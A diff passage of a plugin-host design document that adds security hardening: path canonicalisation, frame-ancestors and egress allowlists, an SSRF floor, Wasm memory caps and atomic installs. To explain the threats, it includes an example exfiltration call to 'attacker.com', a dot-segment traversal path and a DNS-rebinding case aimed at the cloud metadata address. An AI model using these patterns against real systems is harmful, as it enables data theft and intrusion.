@@ -173,9 +173,15 @@ with a 403-shaped reply before anything leaves the host — GZAC's servlet filte
 the authoritative gate; a configuration whose push carried no endpoint list is allowed with a
 warning (§8.2). A plugin-supplied `Authorization` header is **stripped** (and logged) and the
 host-controlled credential is attached last, so a plugin can never substitute its own token. The
-callback fetch is bounded by an `AbortSignal` timeout (`GZAC_API_TIMEOUT_MS`, default 60 s —
-reported as a 504-shaped reply, with a 502-shaped reply for a failed fetch), so a hung GZAC
-endpoint cannot pin the plugin call and its per-plugin lock indefinitely.
+plugin-supplied path is **canonicalised once** (`security/request-path.ts`) and that single
+canonical value is what the allowlist is checked against, what is requested, and what the audit log
+records: `fetch` resolves dot segments while parsing the URL, so checking the raw string would let
+`/api/v1/document/../../../v1/case/1` match a grant on `/api/v1/document/**` and then request
+something else entirely. Percent-encoded separators and dot segments (`%2e`, `%2f`, `%5c`) are
+refused rather than decoded, as is a path that would escape the API root. The callback fetch is
+bounded by an `AbortSignal` timeout (`GZAC_API_TIMEOUT_MS`, default 60 s — reported as a 504-shaped
+reply, with a 502-shaped reply for a failed fetch), so a hung GZAC endpoint cannot pin the plugin
+call and the pooled instance it holds indefinitely.
 
 **3.6 Token lifecycle** — operator-tunable TTL (`valtimo.external-plugin.service-token.ttl`,
 default 10m, §3.2), **no separate refresh loop**. Each healthy discovery poll re-pushes every
@@ -331,7 +337,12 @@ DDL lives in the **core** module's changelog, not the external-plugin module's o
   populated from the add-host UI; the two broker columns nullable for events-off / use-default-exchange),
   **plus** `event_queue_mode` (`LIVE`/`DURABLE`, default `LIVE`, added in
   `20260617-external-plugin-event-queue.xml`) and `event_queue_ttl_ms` (nullable bigint; required
-  when mode is `DURABLE`, ignored when `LIVE`).
+  when mode is `DURABLE`, ignored when `LIVE`), **plus** `frontend_origins` (nullable varchar,
+  changeset `13-32-0/20260812-external-plugin-frontend-origins.xml`): the comma-separated browser
+  origins allowed to embed this host's plugin screens, pushed to the host as its `frame-ancestors`
+  allowlist (§7). Deliberately *not* derived from `gzac_callback_base_url` — that is a
+  server-to-server URL and routinely a different address than the admin's browser uses. NULL (legacy
+  rows) means nothing may frame that host's plugins until an admin fills it in.
 - `external_plugin_definition` — `UNIQUE(plugin_id, version)`, `config_schema`, `manifest_json`,
   `host_id`, `base_url`, `status`, plus `name`, `description`, `provider`, `min_gzac_version` /
   `max_gzac_version` (populated at discovery from the manifest's `compatibility` block, compared
@@ -396,7 +407,8 @@ returns pre-fills the add-host UI uses to populate the new-host form:
   "eventBrokerExchange": "valtimo-events",
   "defaultEventQueueTtlMs": 259200000,
   "minEventQueueTtlMs": 3600000,
-  "maxEventQueueTtlMs": 2592000000
+  "maxEventQueueTtlMs": 2592000000,
+  "frontendOrigins": ["https://valtimo.example.com"]
 }
 ```
 
@@ -418,17 +430,39 @@ a confidential transport (HTTPS, or a loopback address for local development) an
 registration otherwise, so the broker AMQP URL and credentials are never pushed over plaintext
 (§3.9).
 
-The same service exposes a **narrowly-scoped update path** for the event-queue mode/TTL only:
-`PATCH /api/management/v1/external-plugin/host/{hostId}/event-queue` with
-`{eventQueueMode, eventQueueTtlMs}`. `baseUrl`, `secret`, `eventBrokerAmqpUrl`, and
-`eventBrokerExchange` remain immutable — the security check that pins broker credentials to a
-confidential `baseUrl` only needs to run at registration. After the PATCH, the resource triggers
-`discoveryService.discoverAll()` so the host's `EventConsumerManager.sync()` swaps the queue
-immediately instead of waiting for the next polling tick.
+Registration rejections use `ExternalPluginHostValidationException`, which
+`ExternalPluginHostValidationExceptionMapper` renders as a **400** whose `detail` is the operator-
+facing reason. That matters for the add-host UI: the modal keeps everything the admin typed and
+shows the reason inline (`InterceptorSkip: 400` keeps it off the generic error toast), rather than
+the catch-all 500-with-a-reference-id it produced before. Two rejections use it today — a broker on a
+non-confidential base URL, and a base URL that is a *bind* address (`0.0.0.0`, `::`) rather than an
+address GZAC can dial.
+
+The same service exposes **narrowly-scoped update paths** for the two runtime-editable fields.
+`baseUrl`, `secret`, `eventBrokerAmqpUrl`, and `eventBrokerExchange` remain immutable — the security
+check that pins broker credentials to a confidential `baseUrl` only needs to run at registration.
+
+- `PATCH /api/management/v1/external-plugin/host/{hostId}/event-queue` with
+  `{eventQueueMode, eventQueueTtlMs}`. After the PATCH, the resource triggers
+  `discoveryService.discoverAll()` so the host's `EventConsumerManager.sync()` swaps the queue
+  immediately instead of waiting for the next polling tick.
+- `PATCH /api/management/v1/external-plugin/host/{hostId}/frontend-origins` with
+  `{frontendOrigins}` — the browser origins allowed to embed this host's plugin screens (§7).
+  Each entry is validated and canonicalised to a bare `scheme://host[:port]`; wildcards, paths,
+  credentials and non-http(s) schemes are rejected, since a wildcard would defeat the allowlist.
+  The new list is pushed to the host immediately, and re-pushed on every discovery poll anyway.
+
+The add-host form pre-fills `frontendOrigins` from `valtimo.web.cors.corsConfiguration.allowedOrigins`
+(the browser origins the API already trusts — in a split frontend/backend deployment exactly the
+Angular origin set), with wildcard entries dropped. When CORS declares none, the modal falls back to
+the admin's own `window.location.origin`: unlike `gzacCallbackBaseUrl`, that *is* the page the plugin
+will be embedded in.
 
 ## 7. Plugin host 🟡 (`plugin-host/app/`, Node + Fastify + Extism)
 
-Routes: `GET /health`; `*/api/host/plugins[...]` (HMAC-signed §3.9; POST upload, GET list —
+Routes: `GET /health`; `PUT /api/host/gzac-instances` (HMAC-signed §3.9; a GZAC instance announces
+`{gzacBaseUrl, frontendOrigins}` — see the plugin-content CSP below); `*/api/host/plugins[...]`
+(HMAC-signed §3.9; POST upload, GET list —
 each listing entry carries the package `contentHash` GZAC pins at discovery, §11 — and DELETE);
 `POST|PUT|DELETE|GET /api/host/configurations/:configId` (HMAC-signed §3.9; push body
 carries `pluginId, pluginVersion, properties, serviceToken, gzacBaseUrl, eventSubscriptions,
@@ -439,7 +473,10 @@ not match the loaded package's hash is refused with 409 (§11) so a config and i
 token can never reach package bytes other than the pinned ones); `POST
 /plugins/:id/:version/actions/:key`
 (HMAC-signed §3.9 — **no GET variant**); public `GET …/plugin-manifest`, `…/logo`,
-`…/bundles/**` (bundles and logo are served with the strict plugin-content CSP — see below), and
+`…/bundles/**` (bundles and logo are served with the strict plugin-content CSP — see below),
+`GET …/frame-policy?origin=` (a public **probe**, answering `{allowed}` for the one origin the
+caller names — deliberately not a listing, so it never enumerates which GZAC frontends use this
+host), and
 `POST …/data` (the `handle_request` RPC route, §13.4/§13.5 — browser-facing
 with CORS `*` + `OPTIONS` preflight, so it carries no HMAC, but executing Wasm is gated on a
 chain of checks: the request must name a `configurationId` whose pushed configuration exists,
@@ -464,19 +501,41 @@ per consumed event per configuration, one per data/action call — don't hit Pos
 Writes through the registry (push/delete) invalidate the cache immediately; a write done by
 another replica against the shared database becomes visible after at most the TTL; the
 plugin-delete guard's `listByPlugin` reads uncached (staleness there would risk deleting a plugin
-a just-pushed configuration references). The plugin manager serialises calls per plugin (a `lock`
-promise chain to avoid Extism reentrancy — unload, delete, and idle eviction chain through the
-**same** lock, so an instance is never closed mid-execution), sets `prefetch` on the broker
-channel, and computes each loaded package's `contentHash` at load time (§11). Every Wasm call is
-bounded by a hard wall-clock limit
-(`WASM_TIMEOUT_MS`, default 30 s): Extism cancels a timed-out call, the cached instance is
-dropped and the next call starts from a fresh one. The module's linear memory is capped
-(`WASM_MAX_MEMORY_PAGES`, default 4096 pages = 256 MiB; 0 uncaps), and idle instances — each
-holding a worker thread plus Wasm memory — are evicted by a periodic sweep after
-`WASM_INSTANCE_IDLE_TTL_MS` (default 10 min) without a call; the next call transparently
-re-instantiates. All four exports (`handle_action`/`handle_event`/`handle_request`/`handle_submit`)
-funnel through one generic `callExport`; the public `callAction`/`callEvent`/`callRequest`/
-`callSubmit` wrappers only shape their input and host context.
+a just-pushed configuration references). The plugin manager keeps a **per-plugin-version instance
+pool** (`wasm-instance-pool.ts`), sets `prefetch` on the broker channel, and computes each loaded
+package's `contentHash` at load time (§11).
+
+**Concurrency.** An Extism instance is not reentrant, so parallelism comes from having several
+instances rather than from sharing one. Each call leases an instance from its version's pool:
+an idle instance is reused, otherwise one is created while below `WASM_POOL_MAX_INSTANCES`
+(default 10), otherwise the caller queues and waits up to `WASM_POOL_ACQUIRE_TIMEOUT_MS`
+(default 30 s) before the call fails rather than queueing without bound. Instances above
+`WASM_POOL_MIN_INSTANCES` (default 1) are closed as soon as they finish, so a burst does not pin
+its peak footprint afterwards. Unload, delete, and shutdown **drain** the pool — they wait for
+every in-flight call to finish before its instance is closed, so a call is never killed
+mid-execution. Set `WASM_POOL_MAX_INSTANCES=1` for strictly serialised calls. Because handlers for
+one configuration can now run concurrently, a plugin must not assume serialised execution —
+handlers already had to be idempotent because event delivery is at-least-once, and `kv` writes
+already go through the database.
+
+**Execution limits.** Every Wasm call is bounded by a hard wall-clock limit (`WASM_TIMEOUT_MS`,
+default 30 s): Extism cancels a timed-out call, and any failing call's instance is dropped rather
+than returned to the pool, since a trapped or cancelled instance is in an undefined state. Guest
+memory is capped by `WASM_MAX_MEMORY_PAGES` (default 4096 pages = 256 MiB; 0 uncaps), enforced by
+**rewriting the module's own memory declaration in memory at instantiation**
+(`wasm-memory-limit.ts`) — Extism's own `maxPages` option bounds only the host-side blocks used to
+pass input and output across the boundary, while the guest declares and exports its own linear
+memory, so a JS plugin's QuickJS heap would otherwise grow far past the configured cap. With a
+`maximum` in place `memory.grow` fails, the guest allocator reports out of memory, and the call
+fails cleanly while the host serves the next one. The patch is applied to an in-memory copy only,
+so the stored package keeps the exact bytes its `contentHash` was pinned against. The worst-case
+memory footprint per plugin version is therefore `WASM_POOL_MAX_INSTANCES × WASM_MAX_MEMORY_PAGES`.
+Idle instances — each holding a worker thread plus Wasm memory — are evicted by a periodic sweep
+after `WASM_INSTANCE_IDLE_TTL_MS` (default 10 min) without a call, including below the pool
+minimum, so a quiet host returns to zero instances; the next call transparently re-instantiates.
+All four exports (`handle_action`/`handle_event`/`handle_request`/`handle_submit`) funnel through
+one generic `callExport`; the public `callAction`/`callEvent`/`callRequest`/`callSubmit` wrappers
+only shape their input and host context.
 
 - **Action HTTP body** (GZAC→host): `{configurationId, processInstanceId, activityId, documentId?,
   properties}` — note it does **not** carry `actionKey` (URL param) or `configuration` (looked up
@@ -509,14 +568,26 @@ funnel through one generic `callExport`; the public `callAction`/`callEvent`/`ca
   directory — a crafted `../`, absolute, or drive-letter entry name rejects the whole package with
   400 — and only the files a plugin package may legitimately carry are extracted (root-level
   `manifest.json`, `plugin.wasm`, the logo, and `frontend/**`), so a hostile zip cannot plant
-  anything else even inside the temp dir. **A version is never replaced silently**: an upload
-  whose manifest names a `pluginId@version` that already exists — loaded in memory *or* present
-  on disk (`hasVersion`) — is refused with 409 carrying `code: PLUGIN_VERSION_EXISTS` and both
-  content hashes (the loaded package's and the uploaded package's, so callers can tell an
-  identical re-upload apart from different content). Only `?overwrite=true` — which GZAC sends
-  after an admin explicitly confirmed the overwrite and re-reviewed the requested permissions
-  (§11) — replaces the package (hot-reload; logged as a warn for audit). The 201 response
-  carries the stored package's `contentHash` (§11).
+  anything else even inside the temp dir. **The package's identity cannot name a path**: the shared
+  validator restricts `pluginId`/`version` to a charset that cannot express a traversal or a hidden
+  directory, and `manifest.logo` to a plain image file at the package root — the plugin manager
+  re-checks the same rules before it builds any path, so a bad identity reaching it another way
+  still cannot write outside `PLUGIN_STORAGE_DIR`. The route additionally requires the resolved
+  logo to sit directly inside the extraction directory, since it is copied into the stored package
+  and into the content hash GZAC pins. **A version is never replaced silently**: an upload whose
+  manifest names a `pluginId@version` that already exists — loaded in memory *or* present on disk
+  (`hasVersion`) — is refused with 409 carrying `code: PLUGIN_VERSION_EXISTS` and both content
+  hashes (the loaded package's and the uploaded package's, so callers can tell an identical
+  re-upload apart from different content). The existence check and the store run inside **one
+  critical section per `pluginId@version`**, so two concurrent uploads of the same version produce
+  exactly one 201 and one 409 instead of both passing the check and interleaving their writes.
+  Only `?overwrite=true` — which GZAC sends after an admin explicitly confirmed the overwrite and
+  re-reviewed the requested permissions (§11) — replaces the package (hot-reload; logged as a warn
+  for audit). The store **replaces the version directory atomically**: the package is written to a
+  staging sibling, hashed, then swapped in by renaming the previous directory aside and the staging
+  directory into place, so a partial write is never visible and an overwrite leaves no file from
+  the previous package behind. A package that fails to load rolls the swap back, restoring the
+  previous package. The 201 response carries the stored package's `contentHash` (§11).
 - **Plugin-content CSP** (`routes/plugin-bundles.ts`): every response serving plugin-authored
   content — `…/bundles/**` **and** the logo (an SVG can carry script) — carries
   `Content-Security-Policy: default-src 'none'; script-src 'self'; style-src 'self'
@@ -532,19 +603,42 @@ funnel through one generic `callExport`; the public `callAction`/`callEvent`/`ca
   assets live under the bundle path. The CSP `sandbox` directive mirrors the embedding iframe's
   attribute, so a bundle opened directly in a top-level tab is confined to an opaque origin too,
   instead of running same-origin with the host.
+- **`frame-ancestors`** is the one directive computed per request, and it closes a different hole:
+  *who may embed the plugin*. The iframe holds no credential, but an attacker-controlled page that
+  can frame a bundle answers the plugin's proxied calls itself and renders a convincing off-origin
+  fake. The allowlist is the union of the origins every GZAC instance has announced
+  (`PUT /api/host/gzac-instances`, persisted in `gzac_instances`, ignored once older than
+  `FRAME_ANCESTOR_STALE_MS` — there is no deregistration call, so ageing out is what removes a
+  decommissioned GZAC) and the `ALLOWED_FRAME_ANCESTORS` env escape hatch. GZAC re-announces on
+  every discovery poll, which makes the allowlist self-healing: a newly connected GZAC becomes
+  framable within one cycle with neither side restarted. **Fail closed** — with no origins at all
+  the host serves `frame-ancestors 'none'` plus `X-Frame-Options: DENY` (the older header has no
+  allowlist form, so it is only sent in that all-deny case) and logs once naming both ways to
+  populate the list. Lookups go through a short-TTL cached registry (`frame-ancestor-registry.ts`,
+  reusing `CONFIG_CACHE_TTL_MS`) because this sits on the bundle hot path. The frontend SDK
+  additionally probes `…/frame-policy` before trusting an `init` from an unknown parent origin —
+  defence in depth for proxies that strip CSP; an explicit `allowed: false` refuses init, while an
+  unanswerable probe only warns.
 
 Environment (`models/app-config.ts`): `ADMIN_TOKEN` (required — the shared secret used as the
 HMAC key for every GZAC→host route, §3.9), `PORT` (8090),
 `PLUGIN_STORAGE_DIR` (`./plugins`), `LOG_LEVEL` (info), `HOST_ID` (defaults to the OS hostname;
 see §8.4), the execution/abuse bounds `WASM_TIMEOUT_MS` (30 s), `WASM_MAX_MEMORY_PAGES` (4096),
-`WASM_INSTANCE_IDLE_TTL_MS` (10 min), `GZAC_API_TIMEOUT_MS` (60 s), `UPLOAD_MAX_BYTES` (25 MB),
+`WASM_INSTANCE_IDLE_TTL_MS` (10 min), the instance-pool bounds `WASM_POOL_MIN_INSTANCES` (1),
+`WASM_POOL_MAX_INSTANCES` (10) and `WASM_POOL_ACQUIRE_TIMEOUT_MS` (30 s),
+`GZAC_API_TIMEOUT_MS` (60 s), `UPLOAD_MAX_BYTES` (25 MB),
 `DATA_RATE_LIMIT_PER_MINUTE` (120) and `CONFIG_CACHE_TTL_MS` (10 s), plus `DB_HOST` / `DB_PORT`
+`ALLOWED_FRAME_ANCESTORS` (unset — extra browser origins allowed to frame plugin content, on top of
+those GZAC announces) and `FRAME_ANCESTOR_STALE_MS` (7 days — how long a GZAC instance stays in the
+allowlist without re-announcing), plus `DB_HOST` / `DB_PORT`
 (defaults to **5434**, not the standard 5432) / `DB_NAME` / `DB_USER` / `DB_PASSWORD` for the
 host's PostgreSQL, and optional `TLS_CERT_PATH` / `TLS_KEY_PATH` (set together to serve HTTPS —
 §3.9) plus `TLS_CA_PATH` for a certificate chain. `HOST_ALLOW_HTTP` / `HOST_ALLOW_PRIVATE_NETWORK`
-relax the `http_request` target policy for local development (§18.6), and `LOG_RETENTION_DAYS`
-(30) drives the log-retention job (§18.9). **No broker variables** — the host never configures a
-broker itself.
+relax the `http_request` target policy for local development (§18.6),
+`HOST_ALLOWED_INTERNAL_CIDRS` (unset — comma-separated CIDRs this host may reach despite being
+private, the production alternative to `HOST_ALLOW_PRIVATE_NETWORK`, §18.6), and
+`LOG_RETENTION_DAYS` (30) drives the log-retention job (§18.9). **No broker variables** — the host
+never configures a broker itself.
 
 Gaps to close for production: no HTMX `render_page`.
 Host capabilities (`gzac_api`, `http_request`, `kv`, `log`, `frontend_data`) and their persistent
@@ -767,8 +861,20 @@ runtime. It is the single rule set enforced at **both** gates, each importing it
 `@valtimo/plugin-sdk/manifest-validation` subpath: the pack tool (`bin/valtimo-plugin-pack.mjs`,
 build-time, self-references the package's own export) and the plugin host's upload route
 (`routes/host-management.ts`, runtime, returns HTTP 400 `{error, details[]}` on failure). It
-requires a non-empty `pluginId`/`version`, a non-empty `translations` object, and a non-empty
-`name` **and** `description` string in **every** declared locale bucket.
+requires a valid `pluginId`/`version` (see below), a non-empty `translations` object, and a
+non-empty `name` **and** `description` string in **every** declared locale bucket.
+
+**Package identity rules.** `pluginId` and `version` become directory names under
+`PLUGIN_STORAGE_DIR` and segments of public URLs, so the validator restricts them to a charset that
+cannot express a traversal or a hidden directory: 1–64 characters, a letter or digit at both ends,
+and `.`/`-`/`_` only inside. `pluginId` is **lowercase-only**, because a case-insensitive filesystem
+would fold `Foo` and `foo` into one package directory while the database treats them as two distinct
+definitions; `version` additionally allows uppercase and `+` so semver prerelease/build metadata
+such as `1.0.0-RC1+build.5` stays expressible. `logo`, when present, must be a plain file name at
+the package root ending in `.svg`, `.png`, `.jpg` or `.jpeg`. Being in the shared validator means
+these rules are enforced at pack time *and* upload time by construction; the plugin manager re-checks
+them before building any path, so no identity that reached it another way can write outside the
+storage directory.
 
 Frontend SDK (`@valtimo/plugin-sdk/frontend`):
 - `ValtimoPluginSDK` running inside the iframe communicates with the Angular parent via
@@ -802,7 +908,10 @@ Frontend SDK (`@valtimo/plugin-sdk/frontend`):
 **Logo.** Convention: drop `logo.svg`, `logo.png`, `logo.jpg`, or `logo.jpeg` next to
 `manifest.json`. The pack tool detects the first match, includes the file at the zip root, and
 writes `"logo": "logo.svg"` into the manifest *inside the zip* (the source `manifest.json` on
-disk is untouched). The host serves it at `GET /plugins/:id/:version/logo` with the right
+disk is untouched). Because the host copies that file into the stored package — and therefore into
+the content hash GZAC pins — `logo` must name a plain image file at the package root and nothing
+else (§9); the upload route additionally requires the resolved path to sit directly inside the
+extraction directory. The host serves it at `GET /plugins/:id/:version/logo` with the right
 Content-Type. `DefinitionResponse.logoUrl` exposes the absolute URL to the management UI, which
 renders it (a) in the "Configure plugin" tile (`plugin-add-select.component.html`) and (b) in the
 process-link plugin picker (`select-plugin-configuration.component.ts`) — the same surfaces that
@@ -894,7 +1003,12 @@ change that arrives without the confirmed-overwrite flow is treated as an incide
   without changing the hash. The hash is exposed in the plugin listing and the upload response.
   An upload naming an existing `pluginId@version` — loaded *or* on disk — is refused with 409
   (§7) carrying `code: PLUGIN_VERSION_EXISTS` plus the loaded and uploaded packages' hashes;
-  only an explicit `overwrite=true` replaces the package.
+  only an explicit `overwrite=true` replaces the package. The reported hash is always the hash of
+  the **exact stored package**: the upload is staged, hashed, and swapped into place by renaming
+  the version directory, so the reported value can never cover a half-written directory or a
+  concurrent upload's bytes. Because a replaced version's directory is replaced *wholesale*, files
+  from a previous package can no longer survive into the hash or keep being served — an overwrite
+  that drops a frontend bundle really drops it.
 - *Confirmed overwrite — permission re-review, re-pin, re-grant.* GZAC enriches the
   version-exists 409 with the uploaded manifest's requested endpoint/event/capability sets
   (parsed server-side from the zip by `PluginPackageInspector.readManifest`). The upload modal
@@ -1113,7 +1227,7 @@ retry) stayed in the host's database indefinitely. Two mechanisms close this:
 
 - **Ownership.** Every push carries `ownerId` — the GZAC-side **host-row UUID**
   (`ExternalPluginHost.id`), i.e. the identity of the GZAC↔host *relationship*. The host persists
-  it (`owner_id TEXT NULL`, migration 6) as an opaque token and echoes it in
+  it (`owner_id TEXT NULL`, migration 8) as an opaque token and echoes it in
   `GET /api/host/configurations`, which now returns **redacted summaries**
   (`{configurationId, pluginId, pluginVersion, ownerId}`) instead of full configs — a host serves
   many GZAC instances, and the old full-fat listing handed every `ADMIN_TOKEN` holder the service
@@ -1642,6 +1756,22 @@ All iframe surfaces are now implemented: case **tab** (§13.1), **task form** (�
   (strict CSP + `nosniff` + referrer policy on bundles and logo). PostgreSQL integration tests
   green — the `20260806-external-plugin-security-hardening.xml` changeset applies and matches the
   entities.
+- Containment, install atomicity, memory cap and instance pool, all green (vitest):
+  `plugin-sdk/src/manifest-validation.test.ts` (package identity and logo charset — the shared
+  contract the pack tool and the upload route both run), `app/src/security/request-path.test.ts`
+  (`gzac_api` path canonicalisation and refusals), `app/src/wasm-memory-limit.test.ts` (memory
+  section patching, clamping, and round-trip validity via `WebAssembly.compile` — the patched
+  module's `memory.grow` really fails past the cap), `app/src/wasm-instance-pool.test.ts`
+  (parallelism, the hard ceiling under a burst, FIFO waiters, destroy-above-minimum, acquire
+  timeout, drain, discard, factory failure, idle eviction), `app/src/plugin-manager.test.ts`
+  (containment refusals and non-conforming directories skipped at boot; concurrent installs of one
+  version resolve to exactly one 201 and one 409; overwrite drops stale files; a failed load rolls
+  the swap back; instantiation from patched module bytes; pool wiring), and
+  `app/src/host-functions/gzac-api.test.ts` (the traversal-bypass regression). L3
+  (`app/test/wasm/plugin-manager.wasm.test.ts`): the `burn` handler proves two calls to one plugin
+  overlap (~1.6 s for two 1.5 s calls) and serialise at `poolMaxInstances: 1` (~3.0 s); the
+  `mem-bomb` handler proves the cap fails the call with `EXECUTION_ERROR` / "out of memory" while
+  an allocation inside the cap still completes and the host serves the next call.
 - Backend `:backend:plugin:test` (`service/PluginServiceTest`): BUILD SUCCESSFUL — embedded
   `deletePluginConfiguration` proceeds when no fixed process link references the configuration,
   throws `PluginConfigurationInUseException` with the `usages` payload when one does, and a
@@ -1912,12 +2042,66 @@ interface HttpRequestOutput {
 ```
 
 **Security constraints:**
+- **Deny by default** — a destination is refused unless it is in the configuration's egress
+  allowlist (`security/egress-allowlist.ts`). This brings the Wasm half of a plugin in line with the
+  `connect-src 'self'` its iframe half already runs under (§7): without it, an author who cannot
+  beacon out from the browser could `httpRequest.post("https://attacker.com", caseData)` from the
+  backend for the same effect. The realistic threat is not a deliberately hostile author but a
+  **compromised npm dependency inside a plugin the customer legitimately trusts** — injected code
+  phones home to a domain the manifest never declared, which is exactly what a declared-egress
+  allowlist catches. Because the check runs **before any name resolution**, it also closes
+  DNS-encoded exfiltration: an undeclared hostname is never even looked up. What it does *not*
+  close is the author's own declared domain — for a plugin integrating with a vendor's SaaS that
+  endpoint is simultaneously the legitimate destination and a perfect exfil channel. No technical
+  control fixes that; it is a trust decision the customer makes when installing the plugin, and it
+  degrades gracefully: the destination is named on the acceptance screen, it is a party the customer
+  has a commercial relationship with, and with a small fixed destination set the `plugin_logs`
+  record below becomes **auditable** — an unexpected host in it is a finding.
+- **Two declaration sources, unioned** — GZAC merges them and pushes one `allowedEgress` array, so
+  the host never learns which source an entry came from:
+  - `manifest.permissions.egress` — fixed origins the plugin author knows at build time
+    (`api.kvk.nl`). A real grant: stored in `external_plugin_granted_egress`, all-or-nothing
+    against the manifest, shown on the acceptance screen, and **immutable after activation** (like
+    events and capabilities — resettable only via the admin-confirmed version overwrite, §11). A
+    plugin silently gaining a destination on a configuration edit is precisely what this prevents.
+  - `x-egress-target` configuration properties — environment-specific origins only the admin knows
+    (`https://smartdocuments.acme-acc.internal:8443`). No grant table and no acceptance gate of its
+    own, because the admin *typing the value* is the grant. Derived inside `pushToHost` from the
+    already-decrypted properties, which is what keeps the allowlist tracking values that
+    legitimately change on edit. See §18.6.1.
+- **Matched on origin, not hostname** — scheme + host + port. A scheme-less manifest entry
+  (`api.kvk.nl`) means https on 443; hostname-only matching would let an `http://` downgrade through
+  the moment someone sets `HOST_ALLOW_HTTP=true`. A missing port means *the default port*, never
+  "any port", or `sd.internal` would silently authorise `sd.internal:9200`. Wildcards are
+  manifest-only, `*.` prefix only, at least two labels after it (so `*.com` is impossible), match
+  exactly one label, and are rendered distinctly on the acceptance screen — `*.vendor.com` under
+  author-controlled DNS reopens both arbitrary-subdomain exfiltration and the DNS channel.
 - **HTTPS-only by default** — plain-http targets require `HOST_ALLOW_HTTP=true` (local dev).
 - **SSRF guard**: connections to private/reserved addresses are blocked at the socket's own DNS
   lookup (a guarded undici `Agent`, `security/url-guard.ts`), so the address check is pinned to
   the exact addresses being connected to — no DNS-rebinding window — and automatically covers
-  every redirect hop; IP-literal hosts (which skip DNS) are rejected up front. Disabled with
-  `HOST_ALLOW_PRIVATE_NETWORK=true` (local dev).
+  every redirect hop; IP-literal hosts (which skip DNS) are rejected up front. This is a **safety
+  floor beneath the allowlist, not a permission mechanism**: the two layers are complementary, not
+  alternatives. An origin allowlist alone re-opens DNS rebinding (a declared `sd.internal` that
+  resolves to 169.254.169.254), and the address envelope alone is host-global and says nothing about
+  which plugin is calling. Neither is sound on its own.
+- **Operator carve-out, never a bypass** — `HOST_ALLOWED_INTERNAL_CIDRS` (e.g.
+  `10.4.7.12/32,10.4.7.0/24`) declares ranges this host may reach despite being private. Applied
+  *inside* `isPrivateOrReservedAddress`, so both enforcement points (the IP-literal check and the
+  guarded agent's `lookup`) inherit it and the rebinding-proof property survives. **169.254.0.0/16
+  is a hard floor** and is never allowlistable — including its IPv4-mapped forms — because cloud
+  metadata services hand instance credentials to anything that can reach them and no plugin has a
+  legitimate reason to call one; an overlapping entry is refused at startup with a loud error, and
+  the floor is re-checked at runtime. Malformed entries are dropped with a warning, which fails
+  closed. `HOST_ALLOW_PRIVATE_NETWORK=true` remains the **dev-only** switch — it replaces the
+  guarded dispatcher with a bare one, disabling the classifier wholesale, and now logs a loud
+  warning at startup when it is on.
+  > **Keep these ranges narrow, and prefer a NetworkPolicy.** In Kubernetes the right place for
+  > egress policy is a NetworkPolicy or an egress proxy, not an app-level CIDR list. If the answer
+  > to "which CIDR do we allowlist?" is the pod CIDR (`10.42.0.0/16` or similar), the allowlist has
+  > become a no-op: that reaches every pod in the cluster, including GZAC directly by IP — which
+  > also sidesteps the `gzacBaseUrl` origin check, since that compares origin strings and a pod IP
+  > or alternate Service DNS name will not match. Use a specific ClusterIP or a /32.
 - The `url` must not resolve to the configuration's `gzacBaseUrl` origin — use `gzac_api` for
   that.
 - **Redirects are followed manually** (max 5) so every hop re-runs the full target validation —
@@ -1931,7 +2115,8 @@ interface HttpRequestOutput {
 `source: "http_request"`) with method, **redacted URL** (userinfo and query string stripped —
 `user:pass@` and `?token=…` routinely carry secrets, so only scheme+host+path are recorded),
 status, duration, and the calling configuration/plugin id. This gives the admin visibility into
-what external calls plugins make.
+what external calls plugins make — and with a declared destination set it is *auditable* rather than
+merely voluminous: a host in the log that is not on the allowlist is a finding, not noise.
 
 **SDK** (`plugin-sdk/src/http-request.ts`):
 
@@ -1946,6 +2131,81 @@ export const httpRequest = {
 
 Mirrors the `gzacApi` shape. Calls the `http_request` Extism host function under the hood, same
 `Host.getFunctions()` mechanism.
+
+#### 18.6.1 Declaring egress targets
+
+Both declaration sources live in `manifest.json`, and which one a target belongs in follows from who
+knows its value. A target that is the same in every environment is **plugin-intrinsic** — the author
+knows it at build time, so it belongs in `permissions.egress`. A target that differs per customer or
+per environment is **deployment-intrinsic**: a manifest declaration would be forced into one of two
+useless shapes, a wildcard broad enough to be meaningless or a per-environment rebuild of the
+package. Those are already a configuration property the admin fills in, so that is where the grant
+is drawn from — marked with `x-egress-target`, which follows the `x-secret` precedent (§18.4): a
+JSON-Schema keyword the author puts on a property that GZAC walks server-side to decide behaviour.
+
+```json
+{
+  "permissions": {
+    "capabilities": ["http_request"],
+    "egress": ["api.kvk.nl"]
+  },
+  "configurationSchema": {
+    "properties": {
+      "smartDocumentsUrl": { "type": "string", "format": "uri", "x-egress-target": true },
+      "apiKey": { "type": "string", "x-secret": true }
+    }
+  }
+}
+```
+
+Three parties, each declaring only what they actually know:
+
+| Party | Declares | Where |
+|---|---|---|
+| Plugin author | *"I call these fixed services, plus one configurable one"* | `permissions.egress` + `x-egress-target` |
+| Admin | *"in this environment the configurable one is `https://sd.acme-acc.internal:8443`"* | the configuration value, as today |
+| Operator | *"this host may reach `10.4.7.0/24` at all"* | `HOST_ALLOWED_INTERNAL_CIDRS` env |
+
+The effective policy is the **union of both declaration sources**, intersected with the CIDR envelope
+for anything resolving into private space, with 169.254/16 excluded unconditionally:
+
+```
+allowed = inDeclaredOrigins(url)
+          && (blocked(resolvedAddr) ? inOperatorCidrs(resolvedAddr) : true)
+          && !isMetadataAddress(resolvedAddr)          // hard floor, never overridable
+```
+
+Validation rules, enforced at every layer that can catch them early:
+
+- **Pack tool and upload route** (`plugin-sdk/manifest-validation.ts`, shared so the rules are
+  defined once): every `permissions.egress` entry must normalise to an http(s) origin — no
+  credentials, no path, no bare or whole-TLD wildcard — and declaring `egress` requires
+  `http_request` in `capabilities`, the same shape as the existing endpoints→`gzac_api` rule. A
+  property marked `x-egress-target` must be a string with `"format": "uri"`, since GZAC has to parse
+  its value into an origin and a property that never holds a URL would look like a grant while
+  contributing nothing.
+- **Activation/edit** (`ExternalPluginConfigurationService`): granted egress must match the manifest
+  exactly, and a marked property whose value is not a parseable absolute http(s) URL **rejects the
+  configuration** with a message naming the field. Fail closed: silently contributing nothing would
+  leave the admin believing they had granted a destination the host will refuse.
+- **Discovery** (`ExternalPluginDiscoveryService`): a new plugin version that drops the
+  `x-egress-target` flag from a property logs a loud warning, mirroring `warnOnDroppedSecretFlags` —
+  the destination silently disappears from the allowlist otherwise, and the plugin's calls start
+  failing.
+
+Normalisation is mirrored in three places — the SDK module `@valtimo/plugin-sdk/egress` (shared by the
+manifest validator and the host's runtime check), `PluginEgressTargets` in GZAC, and the frontend's
